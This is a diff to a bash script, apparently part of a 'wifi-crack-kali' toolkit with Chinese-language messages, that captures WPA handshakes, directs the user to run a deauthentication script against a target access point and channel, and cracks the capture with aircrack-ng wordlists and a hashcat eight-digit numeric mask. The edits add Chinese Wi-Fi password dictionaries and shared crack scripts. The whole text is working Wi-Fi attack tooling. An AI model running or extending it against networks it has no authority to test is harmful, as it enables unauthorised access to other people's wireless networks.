@@ -38,9 +38,10 @@ if [ -z "$MON" ]; then
     exit 1
 fi
 
-# ---- 创建结果目录 ----
+# ---- 创建结果目录（统一到 wifi-crack-kali/结果/）----
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-RESULT_DIR="${SCRIPT_DIR}/结果/$(date +%Y%m%d_%H%M%S)"
+KALI_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
+RESULT_DIR="${KALI_ROOT}/结果/$(date +%Y%m%d_%H%M%S)"
 mkdir -p "$RESULT_DIR"
 CAP_PREFIX="${RESULT_DIR}/handshake"
 
@@ -58,7 +59,7 @@ echo -e "  ${Y}右上角出现 ${G}WPA handshake: $BSSID${Y} 就说明抓到了�
 echo -e "  ${Y}抓到后按 Ctrl+C 停止${E}"
 echo ""
 echo -e "  ${G}现在打开第3个终端运行:${E}"
-echo -e "  ${G}sudo bash 3_deauth.sh $BSSID${E}"
+echo -e "  ${G}sudo bash 3_deauth.sh $BSSID $CHANNEL${E}"
 echo ""
 
 # ---- 开始捕获 ----
@@ -91,12 +92,14 @@ case "$answer" in
         info "稍后可运行: sudo aircrack-ng -w <字典> $CAP_FILE"
         ;;
     *)
-        # 查找字典
-        DICT_DIR="$(dirname "$SCRIPT_DIR")"
+        # 查找字典（仓库路径优先）
+        REPO_ROOT="$(cd "${KALI_ROOT}/.." && pwd)"
         WORDLIST=""
         for wl in \
-            "${DICT_DIR}/wpa-sec-cracked.txt" \
-            "${DICT_DIR}/wifi_dict.txt" \
+            "${KALI_ROOT}/字典工具/cn_wifi_dict.txt" \
+            "${REPO_ROOT}/shared/dicts/wpa-top4800.txt" \
+            "${REPO_ROOT}/shared/dicts/probable-wpa.txt" \
+            "${REPO_ROOT}/wifi-crack-notebook/dicts/wpa-top4800.txt" \
             "/usr/share/wordlists/rockyou.txt" \
             "/usr/share/wordlists/fasttrack.txt"; do
             [ -f "$wl" ] && { WORDLIST="$wl"; break; }
@@ -127,8 +130,9 @@ case "$answer" in
 
             if [ -s "$HASH_FILE" ]; then
                 ok "Hash 提取成功!"
-                info "hashcat 8位纯数字掩码..."
-                hashcat -m 22000 -a 3 "$HASH_FILE" '?d?d?d?d?d?d?d?d' --potfile-disable --force 2>&1 | tail -10
+                info "hashcat 8位纯数字掩码（可选试跑）..."
+                hashcat -m 22000 -a 3 "$HASH_FILE" '?d?d?d?d?d?d?d?d' --potfile-disable 2>&1 | tail -10 || true
+                ok "建议拷贝到 shared/captures 后用 mac/crack.sh 或 windows/crack.ps1"
             fi
         fi
         ;;
